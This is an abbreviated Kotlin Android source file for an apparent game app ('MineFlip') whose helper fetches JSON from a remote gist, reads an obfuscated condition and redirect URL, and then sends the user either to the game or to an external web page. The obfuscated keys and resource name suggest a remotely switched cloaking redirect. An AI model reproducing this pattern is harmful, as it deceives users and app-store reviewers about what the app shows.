package com.megawin.mineflip

import android.app.Activity
import android.content.Context
import androidx.appcompat.app.AppCompatActivity
import com.megawin.mineflip.databinding.ActivityMainBinding
import com.megawin.mineflip.game.AppDataStore
import com.megawin.mineflip.tool.Network
...
class MegaWin40Helper(
    ...
    constructor(
        ...
        scope,
        Network(
            context.getString(R.string.vsQA3R)
        ),
    )
    ...
    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            dataStore.updateKeyz { "megaWin401" }
    ...
    private fun navigateToNext(url: String) {
        scope.launch(Dispatchers.IO) {
            ...
            dataStore.updateKeyz { "megaWin400" }
    ...
    private fun fetchRemoteConfigData(activity: Activity) {
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString("bit")
                    val redirectUrl = json.getString("least")
    ...
    companion object {
        val FRAGMENT_ID = R.id.megaWin40Fragment
    }
}